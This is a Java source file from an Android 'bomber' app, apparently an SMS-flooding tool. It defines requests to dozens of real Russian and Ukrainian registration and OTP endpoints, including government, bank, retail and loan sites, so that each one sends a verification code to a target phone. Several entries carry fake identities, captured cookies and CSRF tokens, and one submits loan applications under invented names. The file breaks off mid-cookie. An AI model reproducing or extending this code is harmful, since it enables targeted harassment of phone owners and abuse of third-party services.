package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ServicesRepository implements Repository {

    public final static Service[] services = new Service[]{

            new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("instanceId", "123");
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("contactType", "mobile");
                        json.put("contactValue", format(phone.getPhone(), "+7(***)*******"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://my.telegram.org/auth/send_password") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", "+" + phone.toString());
                }
            },

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");

                    return json.toString();
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {

                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", phone.toString());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public void buildBody(Phone phone) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone.getPhone());
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");

                    request.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone.getPhone(), "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", phone.toString());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone.getPhone(), "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone.getPhone(), "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    request.addHeader("Connection", "Keep-Alive");
                    request.addHeader("Accept-Encoding", "gzip");

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new FormService("https://zvonok.com/api/demo/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("csrfmiddlewaretoken", "IR473RdCuTdFJyh1O2PXgiiYrI6DNQFmHiagLFAXOsMlDMdh2DsxuZuEEeOT3kCs");
                    builder.add("type", "confirm");
                    builder.add("phone", format(phone.getPhone(), "+7 (***)***-**-**"));
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("PHONE", phone.toString());
                    builder.add("ECAPTCHA", "undefined");
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addEncodedQueryParameter("contact", phone.toString());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");

                    request.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");
                }
            },

            new JsonService("https://api-new.elementaree.ru/graphql") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "phoneVerification");
                        json.put("query", "mutation phoneVerification($phone: String!) {\n" +
                                "  phoneVerification(phone: $phone) {\n" +
                                "    success\n" +
                                "    interval\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");

                        json.put("variables", new JSONObject()
                                .put("phone", phone.toString()));

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("character", "number");
                    builder.add("phone", phone.getPhone());
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

            new FormService("https://online.lenta.com/api.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("tel", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://liski.skoro-pizza.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "b3cb999a-d3ad-11ec-84bd-d00d1849d38c")
                            .header("x-thapl-domain", "rossosh.skoro-pizza.ru")
                            .header("x-thapl-region-id", "5")
                            .post(RequestBody.create("------WebKitFormBoundaryMUU3NBWAJgnNsU1E\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryMUU3NBWAJgnNsU1E--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMUU3NBWAJgnNsU1E")))
                            .build()).enqueue(callback);
                }
            },

            new JsonService("https://new.victoria-group.ru/api/v2/manzana/Identity/RequestAdvancedPhoneEmailRegistration") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("parameter", new JSONObject()
                                .put("MobilePhone", "+" + phone.toString())
                                .put("CardNumber", null)
                                .put("AgreeToTerms", 1)
                                .put("AllowNotification", 0)
                                .toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.header("X-CSRF-TOKEN", "9ZshUjW4iWYuM95Cgo2WmD9pANxDLHGjEOTnOLAA");
                    request.header("X-Requested-With", "XMLHttpRequest");

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://api-frontend.uservice.io/v2/user/profile/auth/")
                            .post(RequestBody.create("------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone.getPhone(), "+7 *** ***-****") +
                                            "\n------WebKitFormBoundaryS40r7hAsKHLxEAFV\n" +
                                            "Content-Disposition: form-data; name=\"country_id\"\n" +
                                            "\n" +
                                            "1\n" +
                                            "------WebKitFormBoundaryS40r7hAsKHLxEAFV--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryS40r7hAsKHLxEAFV")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://be.budusushi.ua/login", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("LoginForm[username]", "0" + phone);
                }
            },

            new FormService("https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs%3Amain.ajax.AuthActions.sendAuthCode", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("userPhone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    builder.add("SITE_ID", "s1");
                    builder.add("sessid", "fb5f8f6092762d032bfda6fd1f2947ad");
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("PHONE", phone.toString());
                    builder.add("ECAPTCHA", "undefined");

                    request.header("Cookie", "_ym_d=1648577093; _ym_uid=1648577093945352536; PHPSESSID=l8uZ53Njk3Fnh6Sx5k6Fap6hW2CxC42l; ALTASIB_SITETYPE=original; BITRIX_SM_ALMAZ_GUEST_ID=5540491; BITRIX_SM_ALMAZ_LAST_ADV=5_Y; BITRIX_SM_ALMAZ_ALTASIB_LAST_IP=185.100.26.203; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE=%7B%22ID%22%3A%222149%22%2C%22BLOCK_BEGIN%22%3A%223110344704%22%2C%22BLOCK_END%22%3A%223110345727%22%2C%22BLOCK_ADDR%22%3A%22185.100.24.0%20-%20185.100.27.255%22%2C%22COUNTRY_CODE%22%3A%22RU%22%2C%22CITY_ID%22%3A%222149%22%2C%22CITY_NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22REGION_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22COUNTY_NAME%22%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3%22%2C%22BREADTH_CITY%22%3A%2255.574291%22%2C%22LONGITUDE_CITY%22%3A%2242.05151%22%7D; BITRIX_SM_ALMAZ_SALE_UID=101692370; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; BITRIX_SM_ALMAZ_refer=https%3A%2F%2Fwww.google.com%2F; BITRIX_SM_ALMAZ_CURRENT_CURRENCY=RUB; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1656449940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.218161957.1656428115; _gat_gtag_UA_212738426_1=1; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _lhtm_u=62baf6a0c08c1de57308a35b; _lhtm_r=https%3A//www.google.com|60ec84b803dc9ecc5a9bc57a; lh_banner_closed=true; BITRIX_SM_ALMAZ_LAST_VISIT=28.06.2022%2017%3A55%3A42; _ga_EM9HX0LRBQ=GS1.1.1656428114.1.1.1656428143.0; BITRIX_SM_ALMAZ_window_width=983; _ga=GA1.2.274030319.1656428115; lh_widget_system_pages_counter=2");
                }
            },

            new JsonService("https://openapi.welldonego.ru/api/v1/user/create") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("msisdn", phone.toString());
                        json.put("offerAccepted", true);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://qlean.ru/widget-form/http/requestotp") {
                private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37";

                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("connection", 3);
                        json.put("csrfToken", "1a55c5d16d8059e75304cb02ddda566b7d2a96bd22cc92937ee5a894e6dfa734");
                        json.put("login", phone.toString());
                        json.put("send", 1);
                        json.put("userAgent", USER_AGENT);
                        json.put("userType", 1);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.header("User-Agent", USER_AGENT);

                    return json.toString();
                }
            },

            new ParamsService("https://stockmann.ru/ajax/", 7) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("controller", "user");
                    builder.addQueryParameter("action", "registerUser");
                    builder.addQueryParameter("surname", getRussianName());
                    builder.addQueryParameter("name", getRussianName());
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.addQueryParameter("email", getEmail());
                    builder.addQueryParameter("password", "qwerty");
                    builder.addQueryParameter("password_confirm", "qwerty");
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("email", getEmail());
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("middleName", getRussianName());
                        json.put("phone", phone.toString());
                        json.put("via", "sms");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("http://mrroll.ru/user/signin", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("_csrf", "5KvJ6CDYi4Laz2Q6CyFNkL_8Q7XCKIHwZ1GKFyOgvDG82braFuHZs567NFVDWC7Bibo53YoewMVQMsx0E-LteQ==");
                    builder.add("User[phone]", format(phone.getPhone(), "(***)***-**-**"));
                    builder.add("step", "send-sms");

                    request.header("X-CSRF-Token", "ILbsTHW-XK9IK-uHMiEupoGGozbm6QSvl06--OCEZsx4xJ9-Q4cOngxfu-h6WE33t8DZXq7fRZqgLfib0MY3hA==");
                    request.header("X-Requested-With", " XMLHttpRequest");
                }
            },

            new JsonService("https://borrow.zaymigo.com/rpc/v1") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("id", "8bb65e5f-33e2-4e02-b58e-5fec3187f4b5");
                        json.put("jsonrpc", "2.0");
                        json.put("method", "create");
                        json.put("params", new JSONObject()
                                .put("term", 12)
                                .put("marketingFields", new JSONObject()
                                        .put("calc", "v2"))
                                .put("amount", 10000)
                                .put("borrower", new JSONObject()
                                        .put("email", getEmail())
                                        .put("name", getRussianName())
                                        .put("patronymic", getRussianName())
                                        .put("patronymicNotExists", false)
                                        .put("phone", "+" + phone.toString())
                                        .put("phoneParams", new JSONArray())
                                        .put("surname", getRussianName()))
                                .put("agreements", new JSONArray()
                                        .put(new JSONObject()
                                                .put("name", "assignment_of_claims")
                                                .put("val", true))));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://lk.doconline.ru/api/v1/auth/phones/codes") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+ 7 ( *** ) ***-**-**"));
                    builder.add("ksid", "ad040b9d-df39-4e88-9c6c-10e6ba6ffbc6_0");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://my.pochtabank.ru/dbo/registrationService/ib")
                            .post(RequestBody.create("", null))
                            .build()).enqueue(new Callback() {
                        @Override
                        public void onError(@NonNull Call call, @NonNull Exception e) {
                            callback.onError(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("confirmation", "send");
                                json.put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            client.newCall(new Request.Builder()
                                    .url("https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber")
                                    .header("noti", "false")
                                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                                    .header("Cache-Control", "no-cache")
                                    .header("Connection", "keep-alive")
                                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                                    .header("Accept-Encoding", "gzip, deflate, br")
                                    .header("pbib-save", "false")
                                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37")
                                    .header("Cookie", cookie.toString())
                                    .put(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://api-user.privetmir.ru/api/v2/send-code", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("checkApproves", "Y");
                    builder.add("approve1", "on");
                    builder.add("approve2", "on");
                    builder.add("back_url", "");
                    builder.add("scope", "register-user reset-password");
                    builder.add("login", format(phone.getPhone(), "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://familyfriend.com/graphql") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("operationName", "AuthEnterPhoneMutation");
                        json.put("query", "mutation AuthEnterPhoneMutation($input: RequestSignInCodeInput!) {\n" +
                                "  result: requestSignInCode(input: $input) {\n" +
                                "    ... on RequestSignInCodePayload {\n" +
                                "      codeLength\n" +
                                "      phone\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    ... on ErrorPayload {\n" +
                                "      message\n" +
                                "      __typename\n" +
                                "    }\n" +
                                "    __typename\n" +
                                "  }\n" +
                                "}\n");
                        json.put("variables", new JSONObject()
                                .put("input", new JSONObject()
                                        .put("phone", phone.toString())));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service() {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://tv.yota.ru/")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", phone.toString());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", cookie.toString())
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new JsonService("https://www.akbars.ru/api/PhoneConfirm/", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", phone);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://bandeatos.ru/?MODE=AJAX", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("sessid", "404d33f8bac1c1aa4305e6af3ebffa8b");
                    builder.add("FORM_ID", "bx_1789522556_form");
                    builder.add("PHONE_NUMBER", "+" + phone.toString());
                }
            },

            new FormService("https://passport.yandex.ru/registration-validations/phone-confirm-code-submit", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("csrf_token", "3a2c860df9d6b793a1062cb40bf6571642269832:1656577004061");
                    builder.add("track_id", "8871889a827b939106e809c0816c6dce7b");
                    builder.add("display_language", "ru");
                    builder.add("number", "+" + phone.toString());
                    builder.add("confirm_method", "by_sms");
                    builder.add("isCodeWithFormat", "true");

                    request.header("Cookie", "font_loaded=YSv1; is_gdpr=0; is_gdpr_b=COTFARC5cygC; gdpr=0; _ym_uid=1643893010141416800; _ym_d=1652798146; font_loaded=YSv1; yandexuid=7914983681643893008; yuidss=7914983681643893008; ymex=1655575105.oyu.4959164461652775453#1968158134.yrts.1652798134; amcuid=4406858161652983118; skid=1064401191653123531; uniqueuid=345303361654276841; yabs-frequency=/5/0000000000000000/mvQrk4DCvt4KHoFkZ9N-eSoLP1H78__Xm84D2_T454SW/; i=BoH9u854W7rcxdsH1l7gnXMrG/rNSF6osrsaJi7J+YSMW5LrOBGPVdsAnThO3Ap70wSZnZ0HftNPf9fGySNC71OzFPc=; _ym_isad=2; L=e1x6f2x7ZF1fcGx2ZFxqQHxfUgliBFF7CTVYJUQ6JC85HVsQfXhu.1656576669.15024.344649.4788377edf08f876583a87093cc95a2f; pf=eyJmbGFzaCI6e319; pf.sig=WEkihpon3qfXt708UtZSzfT2k62TloAdz1jg6_iLs5Q; yp=1686928109.p_sw.1655392109#1970408029.multib.1#1655720081.mcv.0#1655720081.mcl.aoz1dd#1655720081.szm.1_25%3A1536x864%3A1536x754; ys=; yandex_login=; ilahu=1656605475; mda2_beacon=1656576675309; _yasc=Dw1CMDhU6jQl4Yg0s1m8EdqT54dHp6tbTxEMI47UCqFefOD6HZNaWbHe+ASHaA==; _ym_visorc=b; lah=2:1719649004.15118.eqsQT97eD404jHo5.3zS2y6V9HL6Ei_2p02ujTncoDyp_NHLXddv0Hn_JKMZal9Am75T--od3FDE6kA5BLDDNuCUI9vqgMu2VdfXulkxCM549kUtPVHI2Q8wOCGGU9UKaRmrhQLQLHRKI9Tkm83Lgm5bOCa8XT2E.k7e5D0R8UPb4XarYr_fFWQ");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://pizzaco.ru/api/user/generate-password")
                            .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%B